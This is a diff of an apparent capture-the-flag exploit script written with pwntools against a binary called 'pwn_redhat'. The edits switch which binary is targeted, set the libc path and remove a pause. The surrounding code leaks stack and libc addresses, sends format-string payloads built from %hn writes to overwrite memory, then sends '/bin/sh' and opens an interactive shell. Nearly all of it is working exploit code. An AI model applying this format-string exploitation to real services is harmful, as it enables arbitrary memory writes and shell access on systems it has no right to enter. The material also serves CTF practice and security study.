@@ -12,14 +12,14 @@ if sys.argv[1] == "l":
     context.log_level = "debug"
     # env = {'LD_PRELOAD': ''}
     # io = process("", env = env)
-    #  io = process("./pwn_redhat")
-    io = process("./pwn_redhat_patch_printf")
+    io = process("./pwn_redhat")
+    #  io = process("./pwn_redhat_patch_printf")
     libc = elf.libc
 
 
 else:
     io = remote("localhost", 9999)
-    #  libc = ELF("")
+    libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
 
 
 def DEBUG(cmd = ""):
@@ -35,7 +35,7 @@ if __name__ == "__main__":
     success("libc.address -> {:#x}".format(libc.address))
     stack = int(io.recvuntil("..", drop = True), 16) - 0xe8
     success("stack -> {:#x}".format(stack))
-    pause()
+    #  pause()
 
     payload = "%{}c%{}$hn".format((stack + 0x28) & 0xffff, 0x5 + 6)
     payload += "%{}c%{}$hn".format(2, 0x13 + 6)
@@ -63,9 +63,5 @@ if __name__ == "__main__":
     io.sendlineafter(">>>", payload + '\0')
 
     io.sendline("/bin/sh\0")
-
     io.interactive()
     io.close()
-
-
-
